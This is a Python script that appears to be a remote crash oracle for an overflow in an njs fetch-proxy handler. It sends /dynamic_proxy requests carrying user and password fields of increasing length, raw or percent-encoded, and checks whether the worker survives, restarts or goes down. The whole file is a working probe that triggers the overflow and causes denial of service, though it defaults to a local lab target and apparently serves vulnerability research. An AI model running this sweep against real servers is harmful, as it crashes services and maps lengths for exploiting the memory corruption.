#!/usr/bin/env python3
"""Remote-only keepalive oracle for CVE-2026-8711 / njs js_fetch_proxy.

The probe intentionally uses only client-visible HTTP behavior:

* response to the overflowing request
* whether the same keepalive connection can service a follow-up request
* whether a fresh connection is healthy after the trigger

It does not inspect logs, procfs, coredumps, or local process state.
"""

from __future__ import annotations

import argparse
import socket
import time
import urllib.parse
from dataclasses import dataclass


@dataclass
class HttpResult:
    status: int | None
    reason: str
    headers: dict[str, str]
    body: bytes
    closed: bool
    error: str = ""


def parse_target(value: str, fallback_port: int) -> tuple[str, int]:
    if "://" in value:
        parsed = urllib.parse.urlparse(value)
        return parsed.hostname or "127.0.0.1", parsed.port or fallback_port

    if ":" in value.rsplit("@", 1)[-1]:
        host, port = value.rsplit(":", 1)
        return host, int(port)

    return value, fallback_port


def recv_until(sock: socket.socket, marker: bytes, timeout: float, limit: int) -> tuple[bytes, bool]:
    sock.settimeout(timeout)
    data = bytearray()

    while marker not in data and len(data) < limit:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            return bytes(data), False
        except OSError:
            return bytes(data), True

        if not chunk:
            return bytes(data), True

        data.extend(chunk)

    return bytes(data), False


def read_http_response(sock: socket.socket, timeout: float) -> HttpResult:
    head, closed = recv_until(sock, b"\r\n\r\n", timeout, 65536)
    if not head:
        return HttpResult(None, "", {}, b"", closed, "no response")

    header_end = head.find(b"\r\n\r\n")
    if header_end < 0:
        return HttpResult(None, "", {}, bytes(head), closed, "incomplete headers")

    header_block = head[:header_end].decode("iso-8859-1", "replace")
    body = bytearray(head[header_end + 4 :])
    lines = header_block.split("\r\n")
    status = None
    reason = ""

    if lines:
        parts = lines[0].split(" ", 2)
        if len(parts) >= 2 and parts[1].isdigit():
            status = int(parts[1])
            reason = parts[2] if len(parts) >= 3 else ""

    headers: dict[str, str] = {}
    for line in lines[1:]:
        if ":" not in line:
            continue
        name, value = line.split(":", 1)
        headers[name.strip().lower()] = value.strip()

    content_length = headers.get("content-length")
    if content_length and content_length.isdigit():
        expected = int(content_length)
        while len(body) < expected:
            try:
                chunk = sock.recv(expected - len(body))
            except socket.timeout:
                break
            except OSError as exc:
                return HttpResult(status, reason, headers, bytes(body), True, str(exc))

            if not chunk:
                closed = True
                break

            body.extend(chunk)

    return HttpResult(status, reason, headers, bytes(body), closed)


def request_bytes(host_header: str, path: str, connection: str) -> bytes:
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host_header}",
        "User-Agent: njs-fetch-proxy-keepalive-oracle/1.0",
        "Accept: */*",
        f"Connection: {connection}",
        "",
        "",
    ]
    return "\r\n".join(lines).encode("ascii")


def http_once(host: str, port: int, path: str, timeout: float) -> HttpResult:
    host_header = f"{host}:{port}"
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(request_bytes(host_header, path, "close"))
        return read_http_response(sock, timeout)


def healthy(host: str, port: int, timeout: float) -> bool:
    try:
        result = http_once(host, port, "/", timeout)
    except OSError:
        return False

    return result.status == 200 and b"njs fetch proxy lab ok" in result.body


def credential(length: int, raw_byte: int, mode: str) -> str:
    if mode == "raw":
        return urllib.parse.quote(bytes([raw_byte]) * length, safe="")

    if mode == "percent":
        return "".join(f"%{raw_byte:02X}" for _ in range(length))

    raise ValueError(f"unsupported encoding mode: {mode}")


def dynamic_path(user_len: int, pass_len: int, raw_byte: int, mode: str) -> str:
    user = credential(user_len, raw_byte, mode)
    password = credential(pass_len, raw_byte, mode)
    return f"/dynamic_proxy?u={user}&p={password}"


def keepalive_trial(
    host: str,
    port: int,
    trigger_path: str,
    followup_path: str,
    timeout: float,
    settle_delay: float,
) -> tuple[HttpResult, HttpResult | None, str]:
    host_header = f"{host}:{port}"

    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(request_bytes(host_header, trigger_path, "keep-alive"))
            first = read_http_response(sock, timeout)

            time.sleep(settle_delay)

            try:
                sock.sendall(request_bytes(host_header, followup_path, "close"))
            except OSError as exc:
                return first, None, f"followup-send:{type(exc).__name__}"

            second = read_http_response(sock, timeout)
            return first, second, "ok"

    except OSError as exc:
        first = HttpResult(None, "", {}, b"", True, str(exc))
        return first, None, f"connect-or-first:{type(exc).__name__}"


def classify(first: HttpResult, second: HttpResult | None, fresh_ok: bool) -> str:
    if first.status is None:
        return "no-first"

    if second is None or second.status is None:
        return "first-only"

    if second.status == 200 and fresh_ok:
        return "same-conn-survived"

    if fresh_ok:
        return "worker-replaced"

    return "target-down"


def parse_lengths(value: str) -> list[int]:
    lengths: list[int] = []
    for part in value.split(","):
        part = part.strip()
        if not part:
            continue

        if "-" in part:
            start_s, end_s = part.split("-", 1)
            start, end = int(start_s), int(end_s)
            if end < start:
                raise argparse.ArgumentTypeError(f"invalid range {part!r}")
            lengths.extend(range(start, end + 1))
        else:
            lengths.append(int(part))

    return lengths


def body_sample(body: bytes, size: int = 32) -> str:
    text = body[:size].replace(b"\n", b"\\n").replace(b"\r", b"\\r")
    return repr(text)[2:-1]


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Remote-only keepalive/crash oracle for njs js_fetch_proxy overflow."
    )
    parser.add_argument("--target", default="127.0.0.1:19431", help="HOST:PORT or URL")
    parser.add_argument("--port", type=int, default=19431, help="fallback port")
    parser.add_argument(
        "--mode",
        choices=("user", "pass", "both"),
        default="both",
        help="which credential length to sweep",
    )
    parser.add_argument(
        "--lengths",
        type=parse_lengths,
        default=parse_lengths("120-140,160,192,224,256,384,512,768,1024,1536,2048"),
        help="comma-separated lengths or ranges, for example 120-140,256,512",
    )
    parser.add_argument("--base-user-len", type=int, default=16)
    parser.add_argument("--base-pass-len", type=int, default=16)
    parser.add_argument(
        "--encoding",
        choices=("raw", "percent"),
        default="raw",
        help="send literal bytes or %%XX sequences to exercise ngx_unescape_uri",
    )
    parser.add_argument("--byte", type=lambda value: int(value, 16), default=0x41)
    parser.add_argument("--followup-path", default="/")
    parser.add_argument("--timeout", type=float, default=2.5)
    parser.add_argument("--settle-delay", type=float, default=0.05)
    parser.add_argument("--between-delay", type=float, default=0.1)
    parser.add_argument("--repeat", type=int, default=1)
    args = parser.parse_args()

    host, port = parse_target(args.target, args.port)
    print(f"target     {host}:{port}")
    print("scope      remote HTTP only; no file-read/procfs/log/core/debugger inputs")
    print(f"encoding   {args.encoding} byte=0x{args.byte:02x}")
    print("columns    field len first second fresh class sample")

    if not healthy(host, port, args.timeout):
        print("preflight  failed")
        return 2

    pairs: list[tuple[str, int, int]] = []
    if args.mode in ("user", "both"):
        pairs.extend(("user", length, args.base_pass_len) for length in args.lengths)
    if args.mode in ("pass", "both"):
        pairs.extend(("pass", args.base_user_len, length) for length in args.lengths)

    for round_index in range(args.repeat):
        if args.repeat > 1:
            print(f"round      {round_index + 1}/{args.repeat}")

        for field, user_len, pass_len in pairs:
            path = dynamic_path(user_len, pass_len, args.byte, args.encoding)
            first, second, note = keepalive_trial(
                host,
                port,
                path,
                args.followup_path,
                args.timeout,
                args.settle_delay,
            )
            time.sleep(args.between_delay)
            fresh_ok = healthy(host, port, args.timeout)
            length = user_len if field == "user" else pass_len
            first_s = str(first.status) if first.status is not None else first.error or note
            second_s = "-"
            if second is not None:
                second_s = str(second.status) if second.status is not None else second.error or "closed"

            print(
                f"{field:<9} {length:<5} {first_s:<14} {second_s:<14} "
                f"{'up' if fresh_ok else 'down':<5} {classify(first, second, fresh_ok):<18} "
                f"{body_sample(first.body)}"
            )

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
